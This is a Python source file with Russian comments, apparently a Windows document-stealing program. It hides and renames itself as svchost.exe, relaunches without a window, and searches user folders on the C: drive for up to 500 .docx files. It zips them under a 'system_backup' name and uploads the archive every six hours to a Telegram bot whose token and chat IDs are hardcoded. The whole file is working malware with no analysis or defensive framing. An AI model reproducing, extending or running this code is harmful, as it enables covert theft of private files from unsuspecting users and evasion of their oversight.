# ПРИНУДИТЕЛЬНЫЙ ИМПОРТ ПРОБЛЕМНЫХ МОДУЛЕЙ
import sys
import os

# Явно импортируем все проблемные модули
import unicodedata
import select
import selectors
import idna

# Добавляем пути к стандартной библиотеке
lib_paths = [
    os.path.join(sys.base_prefix, 'DLLs'),
    os.path.join(sys.base_prefix, 'Lib'),
    os.path.join(sys.base_prefix, 'Lib', 'site-packages'),
]

for path in lib_paths:
    if os.path.exists(path) and path not in sys.path:
        sys.path.insert(0, path)
import zipfile
import tempfile
import requests
import ctypes
import time
import win32api
import win32process
import win32con
import win32gui
import win32event
from pathlib import Path
from datetime import datetime

# Конфигурация
TELEGRAM_BOT_TOKEN = "7955855482:AAHb9oNyAtpGIsL37Ae-_Wrowawgi8wCF_8"
TELEGRAM_CHAT_IDS = ["1055158368", "1055158368"]  # Добавьте второй ID

def hide_itself():
    """Скрытие скрипта в системе Windows"""
    try:
        file_path = os.path.abspath(sys.argv[0])
        ctypes.windll.kernel32.SetFileAttributesW(file_path, 2)
        
        hidden_dir = Path(os.environ['APPDATA']) / "Microsoft" / "Windows" / "System32"
        hidden_dir.mkdir(exist_ok=True)
        
        current_script = Path(file_path)
        new_path = hidden_dir / "svchost.exe"
        
        if not current_script.parent.samefile(hidden_dir):
            if current_script != new_path:
                current_script.rename(new_path)
            
            startupinfo = win32process.STARTUPINFO()
            startupinfo.dwFlags = win32con.STARTF_USESHOWWINDOW
            startupinfo.wShowWindow = win32con.SW_HIDE
            
            win32process.CreateProcess(
                None,
                str(new_path),
                None,
                None,
                False,
                win32con.CREATE_NO_WINDOW,
                None,
                None,
                startupinfo
            )
            sys.exit(0)
            
    except Exception:
        pass

def mask_process():
    """Маскировка процесса под системный"""
    try:
        kernel32 = ctypes.windll.kernel32
        current_pid = os.getpid()
        
        try:
            window = win32gui.GetForegroundWindow()
            win32gui.ShowWindow(window, win32con.SW_HIDE)
        except:
            pass
            
    except Exception:
        pass

def find_docx_files():
    """Поиск docx файлов на диске C, исключая системные папки"""
    docx_files = []
    
    system_folders = {
        'Windows', '$WinREAgent', 'Program Files', 'Program Files (x86)',
        'ProgramData', 'System Volume Information', 'Recovery',
        '$Recycle.Bin', 'PerfLogs', 'Config.Msi', 'MSOCache'
    }
    
    user_folders_to_search = [
        'Users', 'Documents', 'Desktop', 'Downloads',
        'OneDrive', 'Dropbox', 'Google Drive'
    ]
    
    try:
        for root, dirs, files in os.walk('C:\\'):
            current_dir = Path(root).name
            if current_dir in system_folders or any(root.startswith(f"C:\\{folder}") for folder in system_folders):
                dirs[:] = []
                continue
            
            if any(keyword in root.lower() for keyword in ['temp', 'cache', 'appdata\\local\\temp']):
                continue
            
            if not any(user_folder.lower() in root.lower() for user_folder in user_folders_to_search):
                if not any(root.startswith(f"C:\\{user_folder}") for user_folder in user_folders_to_search):
                    continue
            
            for file in files:
                if file.lower().endswith('.docx'):
                    full_path = os.path.join(root, file)
                    try:
                        if (os.path.isfile(full_path) and os.access(full_path, os.R_OK) and 
                            os.path.getsize(full_path) > 1024):
                            docx_files.append(full_path)
                            
                            if len(docx_files) >= 500:
                                return docx_files
                    except:
                        continue
            
            if len(docx_files) > 100 and any(root.startswith(f"C:\\{folder}") for folder in ['Windows', 'Program Files']):
                dirs[:] = []
    
    except:
        pass
    
    return docx_files

def create_zip_archive(files_list):
    """Создание ZIP архива с docx файлами"""
    if not files_list:
        return None
        
    temp_dir = tempfile.gettempdir()
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    zip_filename = os.path.join(temp_dir, f"system_backup_{timestamp}.zip")
    
    try:
        with zipfile.ZipFile(zip_filename, 'w', zipfile.ZIP_DEFLATED) as zipf:
            for file_path in files_list:
                try:
                    if file_path.startswith('C:\\'):
                        rel_path = file_path[3:]
                    else:
                        rel_path = os.path.basename(file_path)
                    
                    zipf.write(file_path, rel_path)
                except:
                    continue
                    
        return zip_filename
    except:
        return None

def send_to_telegram(file_path):
    """Отправка файла в Telegram всем указанным ID"""
    if not file_path or not os.path.exists(file_path):
        return False
        
    file_size = os.path.getsize(file_path)
    if file_size > 50 * 1024 * 1024:
        return False
        
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendDocument"
    success = True
    
    try:
        for chat_id in TELEGRAM_CHAT_IDS:
            try:
                with open(file_path, 'rb') as file:
                    files = {'document': file}
                    data = {'chat_id': chat_id}
                    
                    response = requests.post(url, data=data, files=files, timeout=60)
                    if response.status_code != 200:
                        success = False
            except:
                success = False
                
        return success
                
    except:
        return False

def cleanup(zip_file_path):
    """Очистка временных файлов"""
    try:
        if zip_file_path and os.path.exists(zip_file_path):
            time.sleep(2)
            os.remove(zip_file_path)
    except:
        pass

def create_mutex():
    """Создание мьютекса для предотвращения множественных запусков"""
    try:
        mutex = win32event.CreateMutex(None, False, "Global\\SystemHostServiceMutex")
        if win32api.GetLastError() == win32con.ERROR_ALREADY_EXISTS:
            sys.exit(0)
        return mutex
    except:
        return None

def main():
    """Основная функция"""
    # Создаем мьютекс для одного экземпляра
    mutex = create_mutex()
    
    # Маскируем процесс
    mask_process()
    
    # Скрываем файл
    hide_itself()
    
    # Ждем перед началом работы
    time.sleep(10)
    
    while True:
        try:
            docx_files = find_docx_files()
            
            if docx_files:
                zip_file = create_zip_archive(docx_files)
                if zip_file:
                    send_to_telegram(zip_file)
                    cleanup(zip_file)
            
            # Ожидание между запусками (6 часов)
            time.sleep(21600)
            
        except:
            time.sleep(3600)

if __name__ == "__main__":
    try:
        # Прячем консольное окно
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
        
        # Проверяем если это первый запуск
        if len(sys.argv) == 1:
            # Перезапускаемся с скрытыми параметрами
            win32api.ShellExecute(
                0,
                "open",
                sys.argv[0],
                "hidden",
                None,
                win32con.SW_HIDE
            )
            sys.exit(0)
            
        main()
        
    except:
        sys.exit(0)